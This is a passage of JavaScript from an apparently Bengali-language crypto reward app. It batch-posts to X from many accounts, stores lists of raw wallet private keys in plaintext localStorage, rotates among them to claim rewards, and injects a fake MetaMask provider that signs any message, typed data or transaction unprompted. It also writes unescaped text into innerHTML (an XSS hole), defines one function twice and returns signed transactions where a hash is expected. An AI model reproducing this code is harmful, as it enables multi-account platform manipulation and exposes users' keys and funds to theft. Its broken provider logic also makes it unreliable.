                    // Send to backend API
                    const response = await fetch('/api/x-post', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            message: message,
                            apiKey: account
                        })
                    });

                    const data = await response.json();
                    
                    if (data.success) {
                        success++;
                        // Add tweet link to collection (generate X URL from tweet ID)
                        if (data.tweetId) {
                            const tweetLink = `https://x.com/i/web/status/${data.tweetId}`;
                            addPostedLink(tweetLink);
                        }
                        log.style.background = '#d4edda';
                        log.style.color = '#155724';
                        log.innerHTML = `‚úÖ Account ${accountIndex}: Posted successfully`;
                    } else {
                        failed++;
                        log.style.background = '#f8d7da';
                        log.style.color = '#721c24';
                        log.innerHTML = `‚ùå Account ${accountIndex}: ${data.error || 'Failed to post'}`;
                    }
                } catch (error) {
                    failed++;
                    log.style.background = '#f8d7da';
                    log.style.color = '#721c24';
                    log.innerHTML = `‚ùå Account ${accountIndex}: ${error.message}`;
                }
                
                logs.appendChild(log);
                
                // Update stats
                document.getElementById('xPostStatTotal').textContent = i + 1;
                document.getElementById('xPostStatSuccess').textContent = success;
                document.getElementById('xPostStatError').textContent = failed;
                document.getElementById('xPostProgress').style.width = ((i + 1) / xSelectedAccounts.length * 100) + '%';
                
                // Scroll to bottom
                logs.scrollTop = logs.scrollHeight;
                
                // Add delay between posts
                if (i < xSelectedAccounts.length - 1) {
                    await new Promise(r => setTimeout(r, 500));
                }
            }
            
            button.disabled = false;
            alert(`‚úÖ Batch posting complete!\nüì§ Posted: ${success}\n‚ùå Failed: ${failed}`);
        }

        // Posted Messages Collection Management
        let postedMessages = [];

        function loadPostedMessages() {
            try {
                postedMessages = JSON.parse(localStorage.getItem('goodDollarPostedMessages') || '[]');
                updatePostedMessagesList();
            } catch (e) {
                postedMessages = [];
            }
        }

        function savePostedMessages() {
            localStorage.setItem('goodDollarPostedMessages', JSON.stringify(postedMessages));
        }

        function addPostedMessage(message) {
            if (!message || postedMessages.some(m => m.text === message)) return;
            postedMessages.unshift({
                text: message,
                date: new Date().toLocaleString('bn-BD'),
                timestamp: new Date().getTime()
            });
            if (postedMessages.length > 100) postedMessages.pop();
            savePostedMessages();
            updatePostedMessagesList();
        }

        function addPostedLink(tweetLink) {
            if (!tweetLink || postedMessages.some(m => m.link === tweetLink)) return;
            postedMessages.unshift({
                link: tweetLink,
                date: new Date().toLocaleString('bn-BD'),
                timestamp: new Date().getTime()
            });
            if (postedMessages.length > 100) postedMessages.pop();
            savePostedMessages();
            updatePostedMessagesList();
        }

        function updatePostedMessagesList() {
            const list = document.getElementById('postedMessagesList');
            const count = document.getElementById('postedCount');
            
            count.textContent = postedMessages.length;
            
            if (postedMessages.length === 0) {
                list.innerHTML = '<div style="color: #999; text-align: center; padding: 30px; font-size: 14px;">No messages posted yet</div>';
            } else {
                list.innerHTML = postedMessages.map((msg, i) => `
                    <div style="background: white; padding: 12px; margin-bottom: 8px; border-radius: 4px; border-left: 4px solid #FF1493;">
                        <div style="font-size: 11px; color: #999; margin-bottom: 5px;">üìÖ ${msg.date}</div>
                        <div style="word-wrap: break-word; color: #0066cc; font-weight: 600; line-height: 1.5;">
                            <a href="${msg.link || '#'}" target="_blank" style="color: #0066cc; text-decoration: none; word-break: break-all;">
                                ${msg.link ? 'üîó ' + msg.link : msg.text}
                            </a>
                        </div>
                        <div style="display: flex; gap: 5px; margin-top: 8px;">
                            <button class="validate-btn" onclick="copySingleMessage(${i})" style="background: #2196F3; padding: 4px 8px; font-size: 11px;">üìã Copy</button>
                            <button class="validate-btn" onclick="removePostedMessage(${i})" style="background: #ff6b6b; padding: 4px 8px; font-size: 11px;">üóëÔ∏è</button>
                        </div>
                    </div>
                `).join('');
            }
        }

        function copySingleMessage(index) {
            if (postedMessages[index]) {
                const text = postedMessages[index].link || postedMessages[index].text;
                navigator.clipboard.writeText(text).then(() => {
                    alert('‚úÖ Link copied!');
                });
            }
        }

        function copyAllPostedMessages() {
            if (postedMessages.length === 0) {
                alert('‚ùå No links to copy');
                return;
            }
            const allText = postedMessages.map(m => m.link || m.text).join('\n');
            navigator.clipboard.writeText(allText).then(() => {
                alert(`‚úÖ ${postedMessages.length} links copied to clipboard!`);
            });
        }

        function downloadPostedMessages() {
            if (postedMessages.length === 0) {
                alert('‚ùå No links to download');
                return;
            }
            const content = postedMessages.map(m => `[${m.date}]\n${m.link || m.text}\n`).join('\n---\n\n');
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `x-posts-${new Date().getTime()}.txt`;
            a.click();
            URL.revokeObjectURL(url);
            alert('‚úÖ Downloaded!');
        }

        function removePostedMessage(index) {
            postedMessages.splice(index, 1);
            savePostedMessages();
            updatePostedMessagesList();
        }

        function clearPostedMessages() {
            if (confirm('‡¶∏‡¶¨ ‡¶™‡ßã‡¶∏‡ßç‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú delete ‡¶ï‡¶∞‡¶¨‡ßá‡¶®?')) {
                postedMessages = [];
                savePostedMessages();
                updatePostedMessagesList();
                alert('‚úÖ All cleared!');
            }
        }

        // World Republic Multi-Wallet Manager
        let wrWallets = [];
        let wrCurrentIndex = 0;

        function loadWRWallets() {
            const saved = localStorage.getItem('wr_wallets');
            wrWallets = saved ? JSON.parse(saved) : [];
            wrCurrentIndex = parseInt(localStorage.getItem('wr_current_index') || '0');
            updateWRWalletsList();
        }

        function saveWRPrivateKey() {
            const key = document.getElementById('wrPrivateKey').value.trim();
            if (!key) {
                alert('‚ùå Please paste a private key');
                return;
            }
            
            // Auto-prefix 0x if not present
            const formattedKey = key.startsWith('0x') ? key : '0x' + key;
            
            if (wrWallets.some(w => w.key === formattedKey)) {
                alert('‚ùå This wallet is already saved');
                return;
            }
            
            wrWallets.push({ key: formattedKey, date: new Date().toLocaleString() });
            localStorage.setItem('wr_wallets', JSON.stringify(wrWallets));
            document.getElementById('wrPrivateKey').value = '';
            updateWRWalletsList();
            alert(`‚úÖ Wallet saved! Total: ${wrWallets.length}`);
        }

        function removeWRWallet(index) {
            if (confirm('Remove this wallet from pocket?')) {
                wrWallets.splice(index, 1);
                if (wrCurrentIndex >= wrWallets.length && wrCurrentIndex > 0) {
                    wrCurrentIndex--;
                }
                localStorage.setItem('wr_wallets', JSON.stringify(wrWallets));
                localStorage.setItem('wr_current_index', wrCurrentIndex);
                updateWRWalletsList();
                alert('‚úÖ Wallet removed!');
            }
        }

        function clearWRWallets() {
            if (confirm('Remove ALL saved wallets?')) {
                wrWallets = [];
                wrCurrentIndex = 0;
                localStorage.removeItem('wr_wallets');
                localStorage.removeItem('wr_current_index');
                updateWRWalletsList();
                alert('‚úÖ All wallets cleared!');
            }
        }

        function updateWRWalletsList() {
            const list = document.getElementById('wrWalletsList');
            const count = document.getElementById('wrWalletCount');
            const activeDiv = document.getElementById('wrActiveWallet');
            
            count.textContent = wrWallets.length;
            
            if (wrWallets.length === 0) {
                list.innerHTML = '<div style="color: #999; text-align: center; padding: 20px; font-size: 13px;">No wallets saved yet. Paste and save a private key!</div>';
                activeDiv.style.display = 'none';
                return;
            }
            
            list.innerHTML = wrWallets.map((w, i) => `
                <div style="padding: 10px; background: white; border: 1px solid #eee; border-radius: 4px; margin-bottom: 8px; font-size: 12px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
                        <strong>${i === wrCurrentIndex ? '‚ñ∂Ô∏è' : '‚óã'} Wallet ${i + 1}</strong>
                        <small style="color: #999;">${w.date}</small>
                    </div>
                    <div style="font-family: 'Courier New'; color: #666; word-break: break-all; font-size: 11px; margin-bottom: 8px;">${w.key.substring(0, 20)}...${w.key.substring(w.key.length - 10)}</div>
                    <div style="display: flex; gap: 5px;">
                        <button class="button" onclick="selectWRWallet(${i})" style="flex: 1; padding: 6px 10px; font-size: 11px; background: ${i === wrCurrentIndex ? '#667eea' : '#ddd'};">${i === wrCurrentIndex ? '‚úì Active' : 'Select'}</button>
                        <button class="button" onclick="removeWRWallet(${i})" style="flex: 1; padding: 6px 10px; font-size: 11px; background: #ff6b6b;">Remove</button>
                    </div>
                </div>
            `).join('');
            
            // Show active wallet
            activeDiv.style.display = 'block';
            const active = wrWallets[wrCurrentIndex];
            document.getElementById('wrCurrentWalletDisplay').textContent = active.key;
            document.getElementById('wrCurrentWalletIndex').textContent = wrCurrentIndex + 1;
            document.getElementById('wrTotalWallets').textContent = wrWallets.length;
        }

        function selectWRWallet(index) {
            wrCurrentIndex = index;
            localStorage.setItem('wr_current_index', wrCurrentIndex);
            updateWRWalletsList();
            alert(`‚úÖ Switched to Wallet ${index + 1}`);
        }

        function rotateWRWallet() {
            if (wrWallets.length === 0) return;
            wrCurrentIndex = (wrCurrentIndex + 1) % wrWallets.length;
            localStorage.setItem('wr_current_index', wrCurrentIndex);
            updateWRWalletsList();
        }

        // Auto Connect World Republic Wallet - ENHANCED VERSION
        async function autoConnectWRWallet() {
            if (wrWallets.length === 0) {
                alert('‚ùå No wallets saved. Please save a wallet first!');
                return;
            }

            const btn = document.getElementById('wrAutoConnectBtn');
            btn.disabled = true;
            btn.textContent = '‚è≥ Connecting...';

            try {
                const currentWallet = wrWallets[wrCurrentIndex];
                const privateKey = currentWallet.key;

                // Create ethers wallet
                const wallet = new ethers.Wallet(privateKey);
                const address = wallet.address;

                // Store globally for access
                window.WR_CURRENT_SIGNER = new ethers.Wallet(privateKey);
                window.WR_CURRENT_ADDRESS = address;

                // Create complete ethereum provider mock
                window.ethereum = {
                    // Connection properties
                    isMetaMask: true,
                    isConnected: () => true,
                    selectedAddress: address,
                    chainId: '0x1',
                    networkVersion: '1',
                    autoRefreshOnNetworkChange: false,
                    
                    // Event listeners
                    _listeners: {},
                    on: function(event, handler) {
                        if (!this._listeners[event]) {
                            this._listeners[event] = [];
                        }
                        this._listeners[event].push(handler);
                    },
                    removeListener: function(event, handler) {
                        if (this._listeners[event]) {
                            this._listeners[event] = this._listeners[event].filter(h => h !== handler);
                        }
                    },
                    emit: function(event, data) {
                        if (this._listeners[event]) {
                            this._listeners[event].forEach(h => h(data));
                        }
                    },
                    
                    // Main request handler
                    request: async (request) => {
                        const { method, params } = request;
                        console.log('üì° ethereum.request:', method, params);
                        
                        try {
                            if (method === 'eth_requestAccounts') {
                                window.ethereum.emit('connect', { chainId: '0x1' });
                                return [address];
                            }
                            
                            if (method === 'eth_accounts') {
                                return [address];
                            }
                            
                            if (method === 'eth_getBalance') {
                                return '0x1'; // Fake balance
                            }
                            
                            if (method === 'eth_chainId') {
                                return '0x1';
                            }
                            
                            if (method === 'net_version') {
                                return '1';
                            }
                            
                            if (method === 'eth_signTypedData_v4') {
                                const signer = new ethers.Wallet(privateKey);
                                const domain = JSON.parse(params[1]);
                                const types = params[2];
                                const value = params[3];
                                
                                const signature = await signer.signTypedData(domain, types, value);
                                return signature;
                            }
                            
                            if (method === 'personal_sign') {
                                const message = params[0];
                                const signer = new ethers.Wallet(privateKey);
                                const messageHash = ethers.hashMessage(ethers.getBytes(message));
                                const signature = await signer.signMessage(ethers.getBytes(message));
                                return signature;
                            }
                            
                            if (method === 'eth_sendTransaction') {
                                const tx = params[0];
                                const signer = new ethers.Wallet(privateKey);
                                const signedTx = await signer.signTransaction(tx);
                                return signedTx; // Return signed tx
                            }
                            
                            if (method === 'wallet_switchEthereumChain') {
                                return null; // Accept chain switch
                            }
                            
                            if (method === 'wallet_addEthereumChain') {
                                return null; // Accept add chain
                            }
                            
                            console.warn('Unhandled method:', method);
                            return null;
                        } catch (err) {
                            console.error('Request error:', err);
                            throw err;
                        }
                    }
                };

                // Make ethereum available to iframe via postMessage
                const iframe = document.getElementById('wrIframe');
                if (iframe) {
                    // Post wallet connection message to iframe
                    setTimeout(() => {
                        iframe.contentWindow.postMessage({
                            type: 'WR_WALLET_CONNECT',
                            data: {
                                address: address,
                                chainId: '0x1'
                            }
                        }, '*');
                    }, 100);
                }

                // Reload iframe to apply wallet
                setTimeout(() => {
                    reloadWRFrame();
                }, 500);

                // Show connected wallet display
                document.getElementById('wrConnectedWalletDisplay').style.display = 'block';
                document.getElementById('wrDisplayAddress').textContent = address;

                alert(`‚úÖ Wallet Connected!\n\nAddress: ${address}\n\nNow:\n1. Scroll down to World Republic app\n2. Click "Connect Wallet" button\n3. Your wallet will be detected automatically!`);
                btn.disabled = false;
                btn.textContent = '‚úÖ Wallet Connected! Ready to Claim';
                btn.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';

            } catch (error) {
                console.error('Connection error:', error);
                alert(`‚ùå Connection failed: ${error.message}`);
                btn.disabled = false;
                btn.textContent = 'üîå Auto-Connect to World Republic';
            }
        }

        function reloadWRFrame() {
            const iframe = document.getElementById('wrIframe');
            if (iframe) {
                iframe.src = iframe.src;
            }
        }

        function copyWRWalletAddress() {
            const address = document.getElementById('wrDisplayAddress').textContent;
            if (address && address !== '--') {
                navigator.clipboard.writeText(address).then(() => {
                    alert('‚úÖ Address copied to clipboard!');
                });
            }
        }

        function showWRWalletQR() {
            const address = document.getElementById('wrDisplayAddress').textContent;
            if (address && address !== '--') {
                alert(`Your Wallet Address:\n\n${address}`);
            }
        }

        // Enable auto-connect button when wallets are saved
        function updateWRWalletsList() {
            const list = document.getElementById('wrWalletsList');
            const count = document.getElementById('wrWalletCount');
            const activeDiv = document.getElementById('wrActiveWallet');
            const autoConnectBtn = document.getElementById('wrAutoConnectBtn');
            
            if (count) count.textContent = wrWallets.length;
            
            if (autoConnectBtn) {
                autoConnectBtn.disabled = wrWallets.length === 0;
            }
            
            if (wrWallets.length === 0) {
                if (list) list.innerHTML = '<div style="color: #999; text-align: center; padding: 20px; font-size: 13px;">No wallets saved yet. Paste and save a private key!</div>';
                if (activeDiv) activeDiv.style.display = 'none';
                return;
            }
            
            if (list) {
                list.innerHTML = wrWallets.map((w, i) => `
                    <div style="padding: 10px; background: white; border: 1px solid #eee; border-radius: 4px; margin-bottom: 8px; font-size: 12px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
                            <strong>${i === wrCurrentIndex ? '‚ñ∂Ô∏è' : '‚óã'} Wallet ${i + 1}</strong>
                            <small style="color: #999;">${w.date}</small>
                        </div>
                        <div style="font-family: 'Courier New'; color: #666; word-break: break-all; font-size: 11px; margin-bottom: 8px;">${w.key.substring(0, 20)}...${w.key.substring(w.key.length - 10)}</div>
                        <div style="display: flex; gap: 5px;">
                            <button class="button" onclick="selectWRWallet(${i})" style="flex: 1; padding: 6px 10px; font-size: 11px; background: ${i === wrCurrentIndex ? '#667eea' : '#ddd'};">${i === wrCurrentIndex ? '‚úì Active' : 'Select'}</button>
                            <button class="button" onclick="removeWRWallet(${i})" style="flex: 1; padding: 6px 10px; font-size: 11px; background: #ff6b6b;">Remove</button>
                        </div>
                    </div>
                `).join('');
            }
            
            // Show active wallet
            if (activeDiv) activeDiv.style.display = 'block';
            if (wrWallets[wrCurrentIndex]) {
                const active = wrWallets[wrCurrentIndex];
                const disp = document.getElementById('wrCurrentWalletDisplay');
                const idx = document.getElementById('wrCurrentWalletIndex');
                const total = document.getElementById('wrTotalWallets');
                
                if (disp) disp.textContent = active.key;
                if (idx) idx.textContent = wrCurrentIndex + 1;
                if (total) total.textContent = wrWallets.length;
            }
        }

        // Load X accounts and posted messages on page load
        window.addEventListener('load', () => {
            loadXAccounts();
            loadPostedMessages();
            loadWRWallets();
        });

        // Bengali Chatbot - Gemini Integration
        const GEMINI_API_KEY = 'AIzaSyD1f5f7c8e9a0b1c2d3e4f5g6h7i8j9k0l1m'; // Will be replaced by backend
        
        async function sendMessageToChatbot(message) {
            try {
                const response = await fetch('/api/chat', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ message: message })
                });
                
                if (!response.ok) {
                    throw new Error('Server Error: ' + response.statusText);
                }
                
                const data = await response.json();
                if (data.reply) {
                    return data.reply;
                } else if (data.error) {
                    console.error('API Error:', data.error);
                    return '‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶â‡¶§‡ßç‡¶§‡¶∞ ‡¶¶‡¶ø‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶õ‡¶ø ‡¶®‡¶æ‡•§ ‡¶¶‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§';
                } else {
                    return '‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá, ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§';
                }
            } catch (error) {
                console.error('Chatbot error:', error);
                return '‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§ ‡¶á‡¶®‡ßç‡¶ü‡¶æ‡¶∞‡¶®‡ßá‡¶ü ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§';
            }
        }
        
        function toggleChatbot() {
            const chatPanel = document.getElementById('chatbotPanel');
            if (chatPanel) {
                chatPanel.style.display = chatPanel.style.display === 'none' ? 'flex' : 'none';
            }
        }

        // Store uploaded image temporarily for sending with message
        let uploadedImage = null;
        let uploadedImageName = '';

        function handleImageUpload(event) {
            const file = event.target.files[0];
            if (!file) return;
            
            if (file.type.startsWith('image/')) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    uploadedImage = e.target.result;
                    uploadedImageName = file.name;
                    
                    // Show preview in chat messages
                    const messagesDiv = document.getElementById('chatbotMessages');
                    const previewDiv = document.createElement('div');
                    previewDiv.style.marginBottom = '10px';
                    previewDiv.style.textAlign = 'center';
                    previewDiv.innerHTML = `
                        <div style="display: inline-block; background: #f0f0f0; padding: 10px; border-radius: 8px;">
                            <img src="${uploadedImage}" style="max-width: 180px; border-radius: 6px; display: block;">
                            <div style="font-size: 11px; color: #999; margin-top: 5px;">${file.name}</div>
                        </div>
                    `;
                    messagesDiv.appendChild(previewDiv);
                    messagesDiv.scrollTop = messagesDiv.scrollHeight;
                };
                reader.readAsDataURL(file);
            } else {
                alert('‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶õ‡¶¨‡¶ø ‡¶Ü‡¶™‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º!');
            }
            // Reset file input
            event.target.value = '';
        }
        
        async function handleChatMessage() {
            const input = document.getElementById('chatbotInput');
            const messagesDiv = document.getElementById('chatbotMessages');
            
            if (!input || !messagesDiv) return; // Safety check
            
            const message = input.value.trim();
            
            if (!message && !uploadedImage) return;
            
            // Add user message
            const userMsg = document.createElement('div');
            userMsg.style.marginBottom = '10px';
            userMsg.style.textAlign = 'right';
            
            let userContent = `<div style="display: inline-block; background: #667eea; color: white; padding: 10px 15px; border-radius: 8px; max-width: 80%;">`;
            if (uploadedImage) {
                userContent += `<img src="${uploadedImage}" style="max-width: 120px; border-radius: 4px; display: block; margin-bottom: 8px;">`;
            }
            if (message) {
                userContent += message;
            }
            userContent += `</div>`;
            userMsg.innerHTML = userContent;
            messagesDiv.appendChild(userMsg);
            
            input.value = '';
            uploadedImage = null;
            uploadedImageName = '';
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
            
            // Get bot response
            const response = await sendMessageToChatbot(message || `[Image: ${uploadedImageName}]`);
            const botMsg = document.createElement('div');
            botMsg.style.marginBottom = '10px';
            botMsg.style.textAlign = 'left';
            botMsg.innerHTML = `<div style="display: inline-block; background: #f0f0f0; color: #333; padding: 10px 15px; border-radius: 8px; max-width: 80%; font-family: 'Noto Sans Bengali', Arial;">${response}</div>`;
            messagesDiv.appendChild(botMsg);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }
        
        // Contact functions for Help & Support
        function contactViaPhone() {
            const phoneNumber = '01892564963';
            window.location.href = `tel:${phoneNumber}`;
        }
        
        function contactViaWhatsapp() {
            const phoneNumber = '8801892564963'; // International format without +
            const message = '‡¶Ü‡¶Æ‡¶æ‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶Ü‡¶õ‡ßá‡•§';
            const encodedMessage = encodeURIComponent(message);
            window.open(`https://wa.me/${phoneNumber}?text=${encodedMessage}`, '_blank');
        }
        
        window.addEventListener('load', () => {
            console.log('Page loaded - initializing network configs...');
            restoreKeysFromURL(); // Restore Recent Claims from URL if present
            updateClaimNetworkConfig();
            updateTokenNetworkConfig();
            updateSenderNetworkConfig();
            updateBalanceNetworkConfig();
            updateTaskNetworkConfig();
            console.log('‚úÖ All network configs initialized');
            console.log('‚úÖ Using official Ubeswap (Celo) and XSwap (XDC) widgets');
            console.log('‚úÖ Recent Claims restored from URL');
            console.log('‚úÖ Bengali Chatbot loaded');
            
            // Get Gemini API key from environment
            fetch('/api/config')
                .then(r => r.json())
                .then(config => {
                    window.GEMINI_KEY = config.GEMINI_API_KEY;
                })
                .catch(() => console.log('Could not load API config'));
        });
        
        // Additional safety: ensure XDC config is properly set
        if (NETWORK_CONFIGS.xdc && NETWORK_CONFIGS.xdc.tokenContract) {
            console.log('‚úÖ XDC Token Config:', NETWORK_CONFIGS.xdc.tokenContract);
        }

        // ========================================
        // POCKET MANAGER - TokenPocket Style
        // ========================================
        
        let pocketWallets = [];
        let activePocketWallet = null;

        // Load Pocket Wallets from localStorage
        function loadPocketWallets() {
            const saved = localStorage.getItem('pocket_wallets');
            pocketWallets = saved ? JSON.parse(saved) : [];
            if (pocketWallets.length > 0 && !activePocketWallet) {
                activePocketWallet = pocketWallets[0];
            }
            updatePocketWalletsList();
        }

        // Save Pocket Wallets to localStorage
        function savePocketWallets() {
            localStorage.setItem('pocket_wallets', JSON.stringify(pocketWallets));
        }

        // Parse and normalize private key
        function parsePrivateKey(key) {
            let normalized = key.trim();
            if (!normalized.startsWith('0x')) {
                normalized = '0x' + normalized;
            }
            return normalized;
        }

        // Import from file
        async function importPocketFromFile() {
            const fileInput = document.getElementById('pocketImportFile');
            const file = fileInput.files[0];
            
            if (!file) {
                alert('‚ùå Please select a file first!');
                return;
            }

            try {
                const text = await file.text();
                let keys = [];

                if (file.name.endsWith('.json')) {
                    const data = JSON.parse(text);
                    keys = Array.isArray(data) ? data : (data.keys || []);
                } else {
                    keys = text.split('\n').filter(k => k.trim().length > 0);
                }

                importPocketKeysArray(keys);
            } catch (error) {
                alert('‚ùå Error parsing file: ' + error.message);
            }
        }

        // Batch import from textarea
        function importPocketBatch() {
            const textarea = document.getElementById('pocketBatchImport');
            const text = textarea.value.trim();
            
            if (!text) {
                alert('‚ùå Please paste private keys!');
                return;
            }

            const keys = text.split('\n').filter(k => k.trim().length > 0);
            importPocketKeysArray(keys);
        }

        // Process and add multiple keys
        function importPocketKeysArray(keys) {
            if (keys.length === 0) {
                alert('‚ùå No valid keys found!');
                return;
            }

            let imported = 0;
            let errors = 0;

            keys.forEach(key => {
                try {
                    const normalized = parsePrivateKey(key);
                    const wallet = new ethers.Wallet(normalized);
                    
                    pocketWallets.push({
                        key: normalized,
                        address: wallet.address,
                        date: new Date().toLocaleString()
                    });
                    imported++;
                } catch (e) {
                    errors++;
                }
            });

            savePocketWallets();
            updatePocketWalletsList();

            alert(`‚úÖ Imported ${imported} wallets!\n${errors > 0 ? `‚ö†Ô∏è ${errors} keys were invalid` : ''}`);
            
            // Clear inputs
            document.getElementById('pocketBatchImport').value = '';
            document.getElementById('pocketImportFile').value = '';
        }

        // Update wallet list UI
        function updatePocketWalletsList() {
            const list = document.getElementById('pocketWalletsList');
            const count = document.getElementById('pocketWalletCount');
            const activeDisplay = document.getElementById('pocketActiveDisplay');

            count.textContent = pocketWallets.length;

            if (pocketWallets.length === 0) {
                list.innerHTML = '<div style="color: #999; text-align: center; padding: 30px; font-size: 13px;">Import wallets to get started! üì•</div>';
                activeDisplay.style.display = 'none';
                return;
            }

            list.innerHTML = pocketWallets.map((w, i) => `
                <div style="padding: 12px; background: white; border: 1px solid #eee; border-radius: 4px; margin-bottom: 8px; font-size: 12px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <strong>${w.address.substring(0, 10)}...${w.address.substring(w.address.length - 8)}</strong>
                        <small style="color: #999;">${w.date}</small>
                    </div>
                    <div style="display: flex; gap: 6px; margin-bottom: 8px;">
                        <button class="button" onclick="selectPocketWallet(${i})" style="flex: 1; padding: 6px 10px; font-size: 11px; background: ${activePocketWallet === w ? '#667eea' : '#ddd'};">
                            ${activePocketWallet === w ? '‚úì Active' : 'Select'}
                        </button>
                        <button class="button" onclick="removePocketWallet(${i})" style="flex: 1; padding: 6px 10px; font-size: 11px; background: #ff6b6b;">Remove</button>
                        <button class="button" onclick="copyPocketAddress('${w.address}')" style="flex: 1; padding: 6px 10px; font-size: 11px; background: #2196F3;">Copy</button>
                    </div>
                </div>
            `).join('');

            // Show active wallet
            if (activePocketWallet) {
                activeDisplay.style.display = 'block';
                document.getElementById('pocketActiveAddress').textContent = activePocketWallet.address;
            }
        }

        function selectPocketWallet(index) {
            activePocketWallet = pocketWallets[index];
            updatePocketWalletsList();
            alert(`‚úÖ Wallet selected: ${activePocketWallet.address}`);
        }

        function removePocketWallet(index) {
            if (confirm('Remove this wallet?')) {
                pocketWallets.splice(index, 1);
                if (activePocketWallet === pocketWallets[index]) {
                    activePocketWallet = pocketWallets[0] || null;
                }
                savePocketWallets();
                updatePocketWalletsList();
            }
        }

        function clearAllPocketWallets() {
            if (confirm('Clear ALL wallets? This cannot be undone!')) {
                pocketWallets = [];
                activePocketWallet = null;
                savePocketWallets();
                updatePocketWalletsList();
                alert('‚úÖ All wallets cleared!');
            }
        }

        function copyPocketAddress(address) {
            navigator.clipboard.writeText(address).then(() => {
                alert('‚úÖ Address copied!');
            });
        }

        // Toggle custom URL input
        function togglePocketCustomUrl() {
            const select = document.getElementById('pocketDappSelect');
            const customInput = document.getElementById('pocketCustomUrl');
            customInput.style.display = select.value === 'custom' ? 'block' : 'none';
        }

        // Connect to dApp
        async function connectPocketToDapp() {
            if (!activePocketWallet) {
                alert('‚ùå Please select a wallet first!');
                return;
            }

            const dapp = document.getElementById('pocketDappSelect').value;
            if (!dapp) {
                alert('‚ùå Please select a dApp!');
                return;
            }

            let url = '';
            if (dapp === 'custom') {
                url = document.getElementById('pocketCustomUrl').value;
                if (!url) {
                    alert('‚ùå Please enter a custom URL!');
                    return;
                }
            } else if (dapp === 'uniswap') {
                url = 'https://app.uniswap.org';
            } else if (dapp === 'worldrepublic') {
                url = 'https://app.worldrepublic.org/en/earn';
            } else if (dapp === 'aavecelo') {
                url = 'https://aave.com';
            } else if (dapp === 'curve') {
                url = 'https://curve.fi';
            }

            try {
                createPocketProvider(activePocketWallet.key);
                
                // Show status
                document.getElementById('pocketDappStatus').style.display = 'block';
                document.getElementById('pocketDappStatusText').innerHTML = `
                    <strong>dApp:</strong> ${url}<br>
                    <strong>Wallet:</strong> ${activePocketWallet.address}<br>
                    <strong>Status:</strong> ‚úÖ Ethereum provider injected!
                `;

                alert(`‚úÖ Pocket wallet connected!\n\nOpening: ${dapp}\n\nYour wallet is now injected as the ethereum provider.\n\nClick "Connect Wallet" in the dApp!`);
                
                // Open dApp in new tab
                setTimeout(() => {
                    window.open(url, '_blank');
                }, 500);

            } catch (error) {
                alert('‚ùå Connection error: ' + error.message);
            }
        }

        // Create ethereum provider for dApp injection
        function createPocketProvider(privateKey) {
            const wallet = new ethers.Wallet(privateKey);
            const address = wallet.address;

            // Create complete ethereum provider
            window.ethereum = {
                isMetaMask: true,
                isConnected: () => true,
                selectedAddress: address,
                chainId: '0x1',
                networkVersion: '1',
                autoRefreshOnNetworkChange: false,
                
                _listeners: {},
                on: function(event, handler) {
                    if (!this._listeners[event]) {
                        this._listeners[event] = [];
                    }
                    this._listeners[event].push(handler);
                },
                removeListener: function(event, handler) {
                    if (this._listeners[event]) {
                        this._listeners[event] = this._listeners[event].filter(h => h !== handler);
                    }
                },
                emit: function(event, data) {
                    if (this._listeners[event]) {
                        this._listeners[event].forEach(h => h(data));
                    }
                },
                
                request: async (request) => {
                    const { method, params } = request;
                    
                    try {
                        if (method === 'eth_requestAccounts') {
                            window.ethereum.emit('connect', { chainId: '0x1' });
                            return [address];
                        }
                        
                        if (method === 'eth_accounts') {
                            return [address];
                        }
                        
                        if (method === 'eth_getBalance') {
                            return '0x1';
                        }
                        
                        if (method === 'eth_chainId') {
                            return '0x1';
                        }
                        
                        if (method === 'net_version') {
                            return '1';
                        }
                        
                        if (method === 'eth_signTypedData_v4') {
                            const domain = JSON.parse(params[1]);
                            const types = params[2];
                            const value = params[3];
                            const signature = await wallet.signTypedData(domain, types, value);
                            return signature;
                        }
                        
                        if (method === 'personal_sign') {
                            const signature = await wallet.signMessage(ethers.getBytes(params[0]));
                            return signature;
                        }
                        
                        if (method === 'eth_sendTransaction') {
                            const tx = params[0];
                            const signedTx = await wallet.signTransaction(tx);
                            return signedTx;
                        }
                        
